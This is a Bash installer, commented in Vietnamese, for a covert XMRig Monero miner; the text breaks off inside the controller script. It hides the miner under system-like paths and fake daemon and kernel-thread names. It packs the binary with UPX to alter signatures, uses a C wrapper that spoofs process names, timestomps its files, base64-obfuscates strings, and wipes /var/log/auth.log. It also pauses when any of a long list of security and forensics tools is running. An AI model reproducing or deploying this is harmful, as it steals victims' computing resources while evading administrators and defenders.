#!/bin/bash

# --- Cấu hình CỦA BẠN (Cần thiết lập - CỰC KỲ QUAN TRỌNG) ---
# Địa chỉ ví của bạn để nhận Monero. Thay thế bằng địa chỉ ví thực của bạn.
WALLET_ADDRESS="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
# Địa chỉ mining pool và cổng. Thay thế bằng pool bạn muốn sử dụng.
MINING_POOL="pool.hashvault.pro:443"
# Mật khẩu pool (thường là 'x' hoặc email).
POOL_PASSWORD="x"

# --- Cấu hình ẨN GIẤU & TÙY CHỈNH NÂNG CAO TỐI ĐA ---
# Thư mục gốc chứa miner và các script (CỰC KỲ QUAN TRỌNG: đổi tên và đường dẫn. Chọn vị trí ít gây chú ý nhất)
# Gợi ý: /var/lib/bluetooth/system_profiles, /opt/network-tools-cache, /usr/local/share/app_data_mgr, /var/log/system_cache_data
MINER_BASE_DIR="/var/lib/bluetooth/system_profiles"
# Thư mục con bên trong thư mục gốc, cũng nên được đổi tên cho giống hệ thống.
MINER_DATA_SUBDIR="profile_cache"
MINER_DIR="$MINER_BASE_DIR/$MINER_DATA_SUBDIR"

# Danh sách các tên file thực thi XMRig giả mạo (thêm nhiều tên tinh vi hơn)
# Các tên này sẽ được sử dụng cho cả binary đã UPX và loader script/C-wrapper
BIN_NAMES=(
    "systemd-resolved-handler"
    "kworker-task-scheduler"
    "networkd-daemon-controller"
    "dbus-message-broker"
    "udevd-event-processor"
    "auditd-log-collector"
    "snapd-background-agent"
    "gnome-session-manager-helper"
    "pulseaudio-daemon-worker"
    "polkitd-auth-agent"
    "upowerd-battery-monitor"
    "rsyslog-collector-v2"
    "ssh-agent-forwarder"
    "nginx-http-proxy-handler"
    "apache2-worker-process"
    "php-fpm-pool-manager"
    "mysql-query-optimizer"
    "system-update-agent"
    "kernel-module-loader"
    "cron-hourly-updater"
    "systemd-udev-probe"
    "network-config-daemon"
    "cups-filter-driver"
    "modprobe-helper"
    "dbus-daemon-launch"
    "var-log-cleaner"
    "temp-file-processor"
    "memcached-session-handler"
    "redis-background-sync"
    "php-cli-worker"
    "nodejs-event-loop"
    "java-servlet-container"
    "python-web-service"
    "golang-grpc-server"
    "ruby-rails-worker"
    "dotnet-core-host"
    "nginx-cache-worker"
    "apache-access-log"
    "mysql-replication-thread"
    "postgres-background-writer"
    "mongodb-journal-sync"
    "elasticsearch-node-client"
    "kafka-broker-listener"
    "zookeeper-election-follower"
    "rabbitmq-consumer-process"
    "memlockd-daemon"
    "fuse-kernel-handler"
    "kdump-service-monitor"
    "blkio-throttle-daemon"
    "ext4-journal-sync"
    "nfs-daemon-rpc"
    "rpcbind-service"
    "systemd-user-session"
    "user-session-cleanup"
    "gnome-keyring-daemon"
    "gpg-agent-forwarder"
    "at-daemon-worker"
    "anacron-scheduler"
    "systemd-tmpfiles-clean"
    "fwupd-update-daemon"
    "apparmor-parser"
    "containerd-shim"
    "containerd-worker"
    "docker-containerd-shim"
    "kubelet-node-agent"
    "kube-proxy-daemon"
    "etcd-cluster-member"
    "prometheus-exporter"
    "node-exporter"
    "cadvisor-daemon"
    "fluentd-log-forwarder"
    "logstash-pipeline-worker"
    "filebeat-data-shipper"
    "packet-filter-daemon"
    "nftables-ruleset-loader"
    "ipsec-kicker"
    "strongswan-charon"
    "openvpn-daemon"
    "wireguard-kernel-mod"
    "chronyd-time-sync"
    "ntpd-time-sync"
    "timesyncd-helper"
    "acpid-event-handler"
    "irq-softirq-daemon"
    "cpufreq-governor"
    "ksmpsd-daemon"
    "kthreadd-helper"
    "migration/0"
    "rcu_sched"
    "rcuos/0"
    "watchdog/0"
    "watchdog/1"
    "kdevtmpfs"
    "writeback"
    "bioset"
    "mm_percpu_wq"
    "kcompactd0"
    "kblockd"
    "edac-poller"
    "ksoftirqd/0"
    "ksoftirqd/1"
    "ksoftirqd/2"
    "ksoftirqd/3"
    "kworker/0:0"
    "kworker/0:1"
    "kworker/0:2"
    "kworker/1:0"
    "kworker/1:1"
    "kworker/1:2"
    "kworker/u4:0"
    "kworker/u4:1"
    "kworker/u8:0"
    "kworker/u8:1"
    "jbd2/vda1-8"
    "ext4-dio-unwrit"
    "loop0"
    "loop1"
    "loop2"
    "loop3"
    "loop4"
    "loop5"
    "loop6"
    "loop7"
)

# Danh sách các tên tiến trình XMRig sẽ giả mạo khi chạy (càng nhiều, càng giống càng tốt)
# Đây là tên hiển thị trong 'ps aux' hoặc 'htop' nhờ C-wrapper
FAKE_PROCESS_NAMES=(
    "kworker/u16:0"
    "systemd-logind"
    "rsyslogd"
    "irqbalance"
    "dbus-daemon"
    "pulseaudio"
    "gnome-shell"
    "lightdm"
    "systemd-udevd"
    "cron"
    "atd"
    "sshd"
    "nginx: worker process"
    "apache2: worker process"
    "php-fpm: pool www"
    "mysqld"
    "[ksoftirqd/0]"
    "[kswapd0]"
    "watchdog/0"
    "systemd"
    "agetty"
    "upowerd"
    "thermald"
    "polkitd"
    "mdadm"
    "sleep"
    "kdevtmpfs"
    "jbd2/vda1-8"
    "systemd --user"
    "systemd-journald"
    "ksmd"
    "kthreadd"
    "memcached"
    "redis-server"
    "node"
    "java"
    "python3"
    "go"
    "ruby"
    "dotnet"
    "containerd"
    "kubelet"
    "kube-proxy"
    "etcd"
    "prometheus"
    "fluentd"
    "logstash"
    "filebeat"
    "kernel"
    "systemd-tmpfiles"
    "chronyd"
    "ntpd"
    "acpid"
    "irq/0"
    "cpufreq"
    "migration/1"
    "rcu_bh"
    "kjournald"
    "Xorg"
    "bash"
    "zsh"
    "fish"
    "top"
    "htop"
    "iotop"
    "pstree"
    "cp"
    "mv"
    "ls"
    "cat"
    "grep"
    "awk"
    "sed"
    "find"
    "df"
    "du"
    "free"
    "mount"
    "umount"
    "ssh"
    "scp"
    "rsync"
    "sudo"
    "apt"
    "dnf"
    "yum"
    "dpkg"
    "rpm"
    "update-alternatives"
    "crond"
    "anacron"
    "logrotate"
    "systemd-udevd"
    "systemd-timesyncd"
    "systemd-networkd"
    "networkd-dispatcher"
    "wpa_supplicant"
    "NetworkManager"
    "ModemManager"
    "cupsd"
    "apache2"
    "mysqld"
    "php-fpm"
    "nginx"
    "postgresql"
    "redis-server"
    "memcached"
    "mongod"
    "java"
    "python"
    "node"
    "go"
    "ruby"
    "php"
    "sshfs"
    "nfsd"
    "rpc.mountd"
    "rpc.statd"
    "lockd"
    "rlogind"
    "rshd"
    "telnetd"
    "vsftpd"
    "ftpd"
    "sendmail"
    "postfix"
    "exim4"
    "dovecot"
    "opendkim"
    "bind9"
    "dnsmasq"
    "unbound"
    "openvpn"
    "wireguard"
    "ipsec"
    "strongswan"
    "lighttpd"
    "httpd"
    "sshd"
    "docker"
    "dockerd"
    "containerd"
    "kubelet"
    "kube-proxy"
    "kube-apiserver"
    "etcd"
    "prometheus"
    "grafana"
    "alertmanager"
    "node_exporter"
    "cadvisor"
    "fluentd"
    "logstash"
    "filebeat"
    "journalbeat"
    "metricbeat"
    "packetbeat"
    "auditbeat"
    "heartbeat"
    "nginx-exporter"
    "mysql-exporter"
    "postgres-exporter"
    "redis-exporter"
    "mongodb-exporter"
    "elasticsearch-exporter"
    "kafka-exporter"
    "zookeeper-porter"
    "rabbitmq-exporter"
    "haproxy-exporter"
    "squid"
    "privoxy"
    "tor"
    "polipo"
    "dante-server"
    "shadowsocks-libev"
    "v2ray"
    "xray"
    "trojan"
    "gost"
    "frp"
    "openvpn"
    "ipsec"
    "wireguard"
    "openconnect"
    "anyconnect"
    "forticlientsslvpn"
    "expressvpn"
    "nordvpn"
    "protonvpn"
    "openfortivpn"
)

# Cấu hình các mức sử dụng CPU (threads), Nice value, và thời gian
# Format: "threads,min_nice,max_nice,min_duration_minutes,max_duration_minutes"
# Sử dụng 'num_cores_to_use' để có thể tính toán số lõi CPU thực tế
# Thêm nhiều profile để đa dạng hóa hành vi
CPU_PROFILES=(
    "1,18,19,45,120"        # 1 core, ưu tiên cực thấp, chạy ngẫu nhiên 45-120 phút
    "2,15,18,30,90"        # 2 cores, nhẹ, ưu tiên thấp, chạy ngẫu nhiên 30-90 phút
    "3,10,15,60,180"       # 3 cores, trung bình, ưu tiên vừa, chạy ngẫu nhiên 60-180 phút
    "4,8,12,10,30"         # 4 cores, hơi nặng, ưu tiên vừa, chạy ngẫu nhiên 10-30 phút (mô phỏng spike)
    "max,0,5,2,10"         # Max cores (gần full CPU), ưu tiên cao, chạy ngẫu nhiên 2-10 phút (mô phỏng spike)
    "0,19,19,5,15"         # 0 cores, ưu tiên cực thấp, chạy ngẫu nhiên 5-15 phút (tạm dừng)
    "1,10,15,120,240"      # 1 core, ưu tiên vừa, chạy dài (2-4 giờ)
    "2,5,10,60,180"        # 2 cores, ưu tiên cao hơn, chạy vừa (1-3 giờ)
)

# Tỷ lệ phần trăm cơ hội XMRig sẽ chạy trong một chu kỳ (mỗi phút)
CHANCE_TO_RUN=85 # % (85% cơ hội để chạy, 15% cơ hội để dừng)
# Tỷ lệ phần trăm cơ hội để chuyển đổi profile CPU (ngay cả khi chưa hết max_duration)
CHANCE_TO_SWITCH_PROFILE=40 # % (tăng khả năng thay đổi profile)

# Tỷ lệ phần trăm cơ hội để thay đổi tên binary (file thực thi) của XMRig
CHANCE_TO_CHANGE_BIN_NAME=20 # % (tăng khả năng thay đổi tên binary)

# Tỷ lệ phần trăm cơ hội để XMRig tự ngừng hoàn toàn trong một khoảng thời gian ngẫu nhiên
CHANCE_FOR_LONG_PAUSE=7 # % (7% cơ hội mỗi khi chuyển đổi profile)
LONG_PAUSE_MIN_HOURS=2 # Dừng ít nhất 2 giờ
LONG_PAUSE_MAX_HOURS=36 # Dừng tối đa 36 giờ

# Cấu hình cho việc tự động tạo "tải nền" giả mạo
# Tỷ lệ phần trăm cơ hội để chạy một tác vụ nền giả mạo
CHANCE_FOR_FAKE_ACTIVITY=75 # % (75% cơ hội mỗi chu kỳ điều khiển)

# Danh sách các lệnh tạo tải giả mạo và loại hành động
# Format: "command,min_duration_seconds,max_duration_seconds,type_of_activity"
# Các lệnh này sẽ được chạy trong background và có timeout.
FAKE_ACTIVITY_COMMANDS=(
    "dd if=/dev/urandom of=\$MINER_DIR/temp_block_\$(date +%s%N) bs=1M count=\$((RANDOM % 50 + 10)); rm -f \$MINER_DIR/temp_block_*" ",5,20,io_disk_write"
    "find /var/log -type f -mtime +7 -print0 | xargs -0 du > /dev/null 2>&1" ",2,10,cpu_scan_old_logs"
    "grep -r \"error\" /var/log/messages /var/log/syslog > /dev/null 2>&1" ",1,5,cpu_log_check"
    "sleep \$((RANDOM % 5 + 1))" ",1,5,cpu_sleep"
    "sort -R /usr/share/dict/words | head -n \$((RANDOM % 1000 + 100)) | wc -l > /dev/null 2>&1" ",2,8,cpu_text_count"
    "openssl speed -bytes \$((RANDOM % 1024 + 128)) -elapsed \$((RANDOM % 3 + 1)) > /dev/null 2>&1" ",3,15,cpu_crypto_benchmark"
    "curl -s -o /dev/null http://www.google.com/?q=\$RANDOM --max-time 5" ",1,3,net_http_google"
    "ping -c \$((RANDOM % 5 + 1)) 1.1.1.1 --timeout 3 > /dev/null 2>&1" ",1,2,net_ping_cloudflare"
    "df -h > /dev/null 2>&1" ",1,2,system_disk_usage"
    "free -m > /dev/null 2>&1" ",1,2,system_ram_usage"
    "ps aux > /dev/null 2>&1" ",1,2,system_process_list"
    "tar -czf \$MINER_DIR/temp_archive_\$(date +%s%N).tar.gz /etc/logrotate.d/ > /dev/null 2>&1; rm -f \$MINER_DIR/temp_archive_*.tar.gz" ",5,25,io_compress_etc"
    "head -c \$((RANDOM % 1000000 + 100000)) </dev/urandom | sha256sum > /dev/null" ",5,30,cpu_hash_random"
    "apt-get update --dry-run > /dev/null 2>&1" ",5,15,system_apt_sim"
    "echo \"Fake log entry: System check passed for service XYZ at \$(date)\" >> /var/log/syslog" ",1,1,log_injection"
    "cat /dev/null > /var/log/auth.log && echo \"\"" ",1,1,log_clear_auth"
    "touch /tmp/temp_app_file_\$(date +%s)" ",1,1,file_touch"
    "echo \"Some data\" > /tmp/temp_app_data_\$(date +%s) && cat /tmp/temp_app_data_\$(date +%s) > /dev/null && rm -f /tmp/temp_app_data_\$(date +%s)" ",2,5,file_read_write"
    "sudo mdadm --detail --scan > /dev/null 2>&1" ",1,5,system_raid_check" # Mô phỏng kiểm tra RAID
    "sudo /usr/sbin/grub-mkconfig -o /dev/null > /dev/null 2>&1" ",5,15,system_grub_regen_sim" # Mô phỏng tạo lại GRUB config
    "sudo update-initramfs -u > /dev/null 2>&1" ",10,30,system_initramfs_update_sim" # Mô phỏng cập nhật initramfs
    "sudo systemctl list-unit-files --type=service > /dev/null 2>&1" ",1,3,system_service_list" # Liệt kê service
    "sudo ss -tuln > /dev/null 2>&1" ",1,3,net_listen_ports" # Kiểm tra cổng nghe
    "sudo netstat -natp > /dev/null 2>&1" ",1,3,net_all_connections" # Kiểm tra tất cả kết nối
)

# Các từ khóa tiến trình đáng ngờ mà nếu phát hiện sẽ tạm dừng miner
SUSPICIOUS_PROCESS_KEYWORDS=(
    "strace"
    "lsof"
    "tcpdump"
    "wireshark"
    "perf"
    "auditd"
    "systemtap"
    "dtrace"
    "valgrind"
    "gdb"
    "ida"
    "radare2"
    "ghidra"
    "sysdig"
    "falco"
    "snort"
    "zeek"
    "suricata"
    "elk-stack"
    "ossec"
    "fail2ban"
    "clamav"
    "rkhunter"
    "chkrootit"
    "procmon"
    "processmonitor"
    "diskmon"
    "netmon"
    "wireshark"
    "tshark"
    "nmap"
    "masscan"
    "zmap"
    "nessus"
    "openvas"
    "metasploit"
    "cobaltstrike"
    "empire"
    "powershell"
    "pwsh"
    "powershell.exe"
    "wmic"
    "tasklist"
    "netstat" # Nếu được sử dụng bởi người dùng thông thường, không phải daemon
    "ss"      # Nếu được sử dụng bởi người dùng thông thường, không phải daemon
    "htop"
    "top"
    "dmesg"
    "journalctl"
    "grep -i "miner""
    "ps -ef | grep "cpu""
    "lsmod"
    "modinfo"
    "insmod"
    "rmmod"
    "chattr"
    "lsattr"
    "auditctl"
    "fuser"
    "lsof"
    "netstat -lp"
    "ss -lp"
    "ufw status"
    "iptables -L"
    "ip route"
    "arp -a"
    "dig"
    "nslookup"
    "host"
    "whois"
    "traceroute"
    "mtr"
    "nc"
    "ncat"
    "socat"
    "strace"
    "ltrace"
    "readelf"
    "objdump"
    "strings"
    "hexdump"
    "xxd"
    "binwalk"
    "foremost"
    "scalpel"
    " volatility" # Có khoảng trắng để bắt đầu từ đầu dòng trong ps aux
    "rekall"
    "dumpit"
    "winpmem"
    "memdump"
    "ramdump"
    "forensics"
    "forensic"
    "malware"
    "virus"
    "trojan"
    "rootkit"
    "exploit"
    "vulnerability"
)
# Thời gian tạm dừng khi phát hiện tiến trình đáng ngờ (giây)
SUSPICIOUS_PAUSE_MIN_SECONDS=300 # 5 phút
SUSPICIOUS_PAUSE_MAX_SECONDS=1800 # 30 phút

# Tắt hoàn toàn ghi log của XMRig
DISABLE_XMRIG_LOGGING="true"

# Tên Systemd Service giả mạo
SYSTEMD_SERVICE_NAME="systemd-kernel-integrity-monitor.service"

# Tên binary của C-wrapper
WRAPPER_BINARY_NAME="sysd_proc_mgr"

# --- Bắt đầu Cài đặt ---

echo "Bắt đầu cài đặt XMRig và cấu hình tinh vi (Script Bash Tổng Hợp Tối Đa)..."
echo "--- VUI LÒNG ĐẢM BẢO BẠN ĐÃ CẬP NHẬT CÁC CẤU HÌNH Ở ĐẦU SCRIPT! ---"
echo "WALLET_ADDRESS, MINING_POOL, MINER_BASE_DIR, BIN_NAMES, FAKE_PROCESS_NAMES..."
sleep 5 # Cho người dùng thời gian đọc cảnh báo

# 1. Cập nhật hệ thống và cài đặt các gói cần thiết
echo "Cập nhật hệ thống và cài đặt các gói cần thiết..."
if command -v apt &> /dev/null
then
    sudo apt update -y > /dev/null 2>&1
    sudo apt install -y wget build-essential cmake libuv1-dev libssl-dev libhwloc-dev shred curl openssl procps iputils-ping coreutils grep findutils tar gzip pv upx jq gcc make net-tools > /dev/null 2>&1 # Thêm gcc, make, net-tools
elif command -v yum &> /dev/null
then
    sudo yum install -y epel-release > /dev/null 2>&1
    sudo yum install -y wget gcc-c++ make cmake libuv-devel openssl-devel hwloc-devel shred curl openssl procps iputils pv upx jq gcc make net-tools > /dev/null 2>&1 # Thêm gcc, make, net-tools
else
    echo "Hệ điều hành không được hỗ trợ. Vui lòng cài đặt thủ công các gói: wget, build-essential, cmake, libuv1-dev, libssl-dev, libhwloc-dev, shred, curl, openssl, procps, iputils-ping, coreutils, grep, findutils, tar, gzip, pv, upx, jq, gcc, make, net-tools."
    exit 1
fi
echo "Các gói cần thiết đã được cài đặt."

# 2. Tạo thư mục và di chuyển vào đó
echo "Tạo thư mục miner tại $MINER_DIR..."
sudo mkdir -p "$MINER_DIR"
sudo chown "$USER":"$USER" "$MINER_DIR" # Đảm bảo người dùng hiện tại có quyền
cd "$MINER_DIR" || { echo "Lỗi: Không thể vào thư mục $MINER_DIR. Thoát."; exit 1; }
echo "Đã vào thư mục $MINER_DIR."

# 3. Tải XMRig
echo "Tải XMRig phiên bản mới nhất cho Linux (static build)..."
XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.23.0/xmrig-6.23.0-linux-static-x64.tar.gz"
XMRIG_ARCHIVE=$(basename "$XMRIG_URL")
MINER_ORIGINAL_NAME="xmrig_orig"

wget "$XMRIG_URL" -q --show-progress
if [ $? -ne 0 ]; then
    echo "Lỗi: Không thể tải xuống XMRig. Thoát."
    exit 1
fi
echo "Đã tải xuống XMRig."

# 4. Giải nén XMRig và nén bằng UPX
echo "Giải nén XMRig và nén bằng UPX để làm thay đổi chữ ký..."
tar -xzf "$XMRIG_ARCHIVE" --strip-components=1 -C .
mv xmrig "$MINER_ORIGINAL_NAME"

if command -v upx &> /dev/null; then
    upx -9 "$MINER_ORIGINAL_NAME" > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo "XMRig đã được nén bằng UPX thành công."
    else
        echo "Warning: UPX nén XMRig thất bại. Tiếp tục mà không UPX."
        mv "$MINER_ORIGINAL_NAME" "xmrig_unpacked"
        MINER_ORIGINAL_NAME="xmrig_unpacked"
    fi
else
    echo "Warning: UPX không tìm thấy. Tiếp tục mà không UPX."
    mv "$MINER_ORIGINAL_NAME" "xmrig_unpacked"
    MINER_ORIGINAL_NAME="xmrig_unpacked"
fi

shred -u "$XMRIG_ARCHIVE" > /dev/null 2>&1 # Xóa file archive gốc
rm -rf xmrig-6.23.0 > /dev/null 2>&1 # Xóa thư mục giải nén tạm thời
echo "Đã giải nén và xử lý XMRig."

# 5. Tạo C Wrapper và biên dịch
echo "Tạo và biên dịch C wrapper để đổi tên tiến trình (argv[0])..."
C_WRAPPER_SOURCE="simple_wrapper_src.c" # Đặt tên file nguồn khác để tránh trùng lặp nếu có
cat <<EOF > "$C_WRAPPER_SOURCE"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/prctl.h> // For PR_SET_NAME

int main(int argc, char *argv[]) {
    if (argc < 4) { // new_proc_name, path_to_xmrig, xmrig_config_path
        fprintf(stderr, "Usage: %s <new_process_name> <path_to_xmrig> <xmrig_config_path>\\n", argv[0]);
        return 1;
    }

    char *new_proc_name = argv[1];
    char *xmrig_path = argv[2];
    char *xmrig_config_path = argv[3];

    // Set the new process name (this changes argv[0] and visible name in 'ps')
    // Suppress potential error output from prctl in child process
    if (prctl(PR_SET_NAME, (unsigned long)new_proc_name, 0, 0, 0) == -1) {
        // perror("prctl(PR_SET_NAME) failed");
    }

    // Prepare arguments for execv: new_proc_name, "-c", xmrig_config_path, NULL
    char *xmrig_args[4];
    xmrig_args[0] = new_proc_name; // Set argv[0] to the desired fake name
    xmrig_args[1] = (char *)"-c";
    xmrig_args[2] = xmrig_config_path;
    xmrig_args[3] = NULL; // Null-terminate the argument list

    // Execute XMRig, replacing the current process
    execv(xmrig_path, xmrig_args);

    // If execv returns, it means an error occurred
    // perror("execv failed");
    return 1; // Indicate error
}
EOF

gcc "$C_WRAPPER_SOURCE" -o "$WRAPPER_BINARY_NAME" > /dev/null 2>&1 -s # -s để bỏ debug info
if [ $? -eq 0 ]; then
    echo "C wrapper biên dịch thành công."
    chmod +x "$WRAPPER_BINARY_NAME"
    shred -u "$C_WRAPPER_SOURCE" > /dev/null 2>&1 # Xóa mã nguồn C sau khi biên dịch
else
    echo "ERROR: C wrapper biên dịch thất bại. Miner sẽ sử dụng phương pháp đặt tên tiến trình cũ của XMRig (ít ẩn hơn)."
    rm -f "$WRAPPER_BINARY_NAME" > /dev/null 2>&1 # Xóa binary lỗi nếu có
    WRAPPER_BINARY_NAME="" # Đánh dấu là không có wrapper
fi

# 6. Tạo các file cấu hình XMRig cho mỗi profile CPU
echo "Tạo các file cấu hình XMRig cho các profile CPU khác nhau..."

NUM_PHYSICAL_CORES=$(grep '^cpu cores' /proc/cpuinfo | uniq | awk '{print $4}')
if [ -z "$NUM_PHYSICAL_CORES" ]; then
    NUM_PHYSICAL_CORES=$(nproc --all)
    echo "Warning: Could not detect physical CPU cores. Using total logical cores: $NUM_PHYSICAL_CORES"
fi

create_config_file() {
    local profile_id=$1
    local cpu_threads_raw=$2
    local nice_min=$3
    local nice_max=$4
    local log_file_config="null"
    local print_time_config=""

    if [ "$DISABLE_XMRIG_LOGGING" = "false" ]; then
        log_file_config="\"xmrig_profile_${profile_id}.log\""
        print_time_config='"print-time": '$(( RANDOM % 300 + 120 ))','
    fi
    
    local cpu_threads_config=""
    if [ "$cpu_threads_raw" == "max" ]; then
        cpu_threads_config="null" # XMRig sẽ tự động phát hiện số lõi
    else
        local num_threads=$cpu_threads_raw
        if [ "$num_threads" -gt "$NUM_PHYSICAL_CORES" ]; then
            num_threads=$NUM_PHYSICAL_CORES
        fi
        
        local selected_cores=()
        local all_cores=()
        for ((i=0; i<NUM_PHYSICAL_CORES; i++)); do
            all_cores+=("$i")
        done
        
        for ((i=0; i<num_threads; i++)); do
            if [ ${#all_cores[@]} -eq 0 ]; then break; fi
            
            # Fix: Lấy kích thước mảng vào một biến riêng trước khi sử dụng
            local num_available_cores=${#all_cores[@]}
            local rand_idx=$(( RANDOM % num_available_cores ))
            
            selected_cores+=("${all_cores[$rand_idx]}")
            unset 'all_cores[$rand_idx]'
            # Re-index the array to remove gaps after unset
            all_cores=( "${all_cores[@]}" ) 
        done
        
        if [ ${#selected_cores[@]} -gt 0 ]; then
            cpu_threads_config="[$(IFS=','; echo "${selected_cores[*]}")]" # Đã sửa lỗi: Thêm dấu đóng ngoặc vuông cho mảng JSON
        else
            cpu_threads_config="[0]"
        fi
    fi
    
    # Randomly select a fake process name from the list for XMRig's internal custom-name
    # This acts as a fallback if the C wrapper fails or for additional camouflage.
    RANDOM_FAKE_PROCESS_NAME=${FAKE_PROCESS_NAMES[$RANDOM % ${#FAKE_PROCESS_NAMES[@]}]}
    RANDOM_NICE_VALUE=$(( nice_min + RANDOM % (max_nice - nice_min + 1) ))

    cat <<EOF > config_profile_${profile_id}.json
{
    "autosave": false,
    "cpu": {
        "enabled": true,
        "rx": ${cpu_threads_config},
        "cctp": null,
        "asm": true
    },
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "$MINING_POOL",
            "user": "$WALLET_ADDRESS",
            "pass": "$POOL_PASSWORD",
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "log-in": null
        }
    ],
    "log-file": ${log_file_config},
    ${print_time_config}
    "background": true,
    "syslog": false,
    "nice": ${RANDOM_NICE_VALUE},
    "daemon": true,
    "custom-name": "$RANDOM_FAKE_PROCESS_NAME"
}
EOF
}

for i in "${!CPU_PROFILES[@]}"; do # Sử dụng ! để lấy index
    profile_info=${CPU_PROFILES[$i]}
    threads_raw=$(echo "$profile_info" | cut -d',' -f1)
    min_nice=$(echo "$profile_info" | cut -d',' -f2)
    max_nice=$(echo "$profile_info" | cut -d',' -f3)
    create_config_file "$i" "$threads_raw" "$min_nice" "$max_nice"
done
echo "Đã tạo các file cấu hình XMRig."

# 7. Di chuyển XMRig binary
echo "Di chuyển XMRig binary vào vị trí ẩn..."
if [ -f "$MINER_ORIGINAL_NAME" ]; then
    # Lưu binary thật với tên ẩn và dấu chấm để tránh bị liệt kê dễ dàng
    RANDOM_BIN_NAME_FOR_XMRIG_FILE=${BIN_NAMES[$RANDOM % ${#BIN_NAMES[@]}]} # Tên file ẩn của XMRig
    MINER_ACTUAL_PATH="$MINER_DIR/.$RANDOM_BIN_NAME_FOR_XMRIG_FILE.bin" 
    mv "$MINER_ORIGINAL_NAME" "$MINER_ACTUAL_PATH"
    chmod +x "$MINER_ACTUAL_PATH"
    echo "Đã di chuyển XMRig binary."
else
    echo "ERROR: XMRig original binary not found. Installation aborted."
    exit 1
fi

# 8. Timestomping - Thay đổi timestamp của các file liên quan để khớp với file hệ thống
echo "Thay đổi timestamp của các file miner để khớp với file hệ thống..."
RANDOM_SYSTEM_FILE=$(find /bin /usr/bin /sbin /usr/sbin -type f -perm /u=s -print0 | shuf -n 1 -z) 
if [ -z "$RANDOM_SYSTEM_FILE" ]; then
    RANDOM_SYSTEM_FILE="/bin/ls" # Fallback nếu không tìm thấy file SUID
fi
echo "Using timestamp from: $RANDOM_SYSTEM_FILE"

for file in "$MINER_DIR"/*; do
    if [ -f "$file" ]; then
        touch -r "$RANDOM_SYSTEM_FILE" "$file" > /dev/null 2>&1
    fi
done
echo "Đã timestomp các file."

# 9. Tạo script điều khiển chính (master_controller.sh)
echo "Tạo script điều khiển chính (master_controller.sh) cho Systemd service..."
cat <<EOF > master_controller.sh
#!/bin/bash

# Các chuỗi quan trọng được mã hóa Base64 để làm rối static analysis
base_dir_encoded="$(echo "$MINER_DIR" | base64)" 
bin_names_encoded=(
    $(for name in "${BIN_NAMES[@]}"; do echo -n "\"$(echo "$name" | base64)\" "; done)
)
fake_process_names_encoded=(
    $(for name in "${FAKE_PROCESS_NAMES[@]}"; do echo -n "\"$(echo "$name" | base64)\" "; done)
)
cpu_profiles_encoded=(
    $(for profile in "${CPU_PROFILES[@]}"; do echo -n "\"$(echo "$profile" | base64)\" "; done)
)
fake_activity_commands_encoded=(
    $(for cmd in "${FAKE_ACTIVITY_COMMANDS[@]}"; do echo -n "\"$(echo "$cmd" | base64)\" "; done)
)
suspicious_process_keywords_encoded=(
    $(for kw in "${SUSPICIOUS_PROCESS_KEYWORDS[@]}"; do echo -n "\"$(echo "$kw" | base64)\" "; done)
)

CHANCE_TO_RUN=$CHANCE_TO_RUN
CHANCE_TO_SWITCH_PROFILE=$CHANCE_TO_SWITCH_PROFILE
CHANCE_TO_CHANGE_BIN_NAME=$CHANCE_TO_CHANGE_BIN_NAME
CHANCE_FOR_LONG_PAUSE=$CHANCE_FOR_LONG_PAUSE
LONG_PAUSE_MIN_HOURS=$LONG_PAUSE_MIN_HOURS
LONG_PAUSE_MAX_HOURS=$LONG_PAUSE_MAX_HOURS
CHANCE_FOR_FAKE_ACTIVITY=$CHANCE_FOR_FAKE_ACTIVITY
SUSPICIOUS_PAUSE_MIN_SECONDS=$SUSPICIOUS_PAUSE_MIN_SECONDS
SUSPICIOUS_PAUSE_MAX_SECONDS=$SUSPICIOUS_PAUSE_MAX_SECONDS

# File lưu trạng thái hiện tại của miner (bắt đầu bằng dấu chấm để ẩn)
STATE_FILE="\$(decode_string "\$base_dir_encoded")/.miner_state"
touch "\$STATE_FILE" > /dev/null 2>&1 # Ensure file exists
chmod 600 "\$STATE_FILE" > /dev/null 2>&1

# File ghi log riêng của controller (sẽ bị xóa bởi cleanup_traces.sh)
CONTROLLER_LOG="\$(decode_string "\$base_dir_encoded")/controller.log"

# Binary của C wrapper và đường dẫn XMRig thực tế
WRAPPER_BINARY_NAME="$WRAPPER_BINARY_NAME"
MINER_ACTUAL_PATH_ENCODED="$(echo "$MINER_ACTUAL_PATH" | base64)" 

# Hàm giải mã chuỗi Base64
decode_string() {
    echo "\$1" | base64 -d
}

# Hàm ghi log cho controller
log_message() {
    echo "\$(date +'%Y-%m-%d %H:%M:%S'): \$1" >> "\$CONTROLLER_LOG"
}

# Hàm dừng XMRig hiện tại (bất kể tên tiến trình hiện tại là gì)
stop_miner() {
    local decoded_fake_process_names=()
    for encoded_name in "\${fake_process_names_encoded[@]}"; do
        decoded_fake_process_names+=("\$(decode_string "\$encoded_name")")
    done
    local decoded_bin_names=() # Bao gồm cả tên của C wrapper
    for encoded_name in "\${bin_names_encoded[@]}"; do
        decoded_bin_names+=("\$(decode_string "\$encoded_name")")
    done

    # Sử dụng pgrep với OR logic để tìm nhiều pattern, tránh giết chính controller
    local pids_to_kill=\$(pgrep -f "minerd|xmrig|cpuminer|\$(IFS='|'; echo "\${decoded_fake_process_names[*]}")|\$(IFS='|'; echo "\${decoded_bin_names[*]}")|\$(decode_string "\$MINER_ACTUAL_PATH_ENCODED")" | grep -v "\$\$" | grep -v "master_controller.sh")

    if [ -n "\$pids_to_kill" ]; then
        for pid in \$pids_to_kill; do
            kill -9 \$pid > /dev/null 2>&1 # Buộc dừng tiến trình
        done
        log_message "Stopped existing miner processes."
    fi
}

# Hàm khởi động XMRig với cấu hình và tên mới
start_miner() {
    local config_id=\$1
    local current_bin_name_encoded=\$2 # Tên file mà C wrapper sẽ giả mạo
    local current_bin_name="\$(decode_string "\$current_bin_name_encoded")"
    local config_file="config_profile_\${config_id}.json"
    local miner_config_full_path="\$(decode_string "\$base_dir_encoded")/\$config_file"

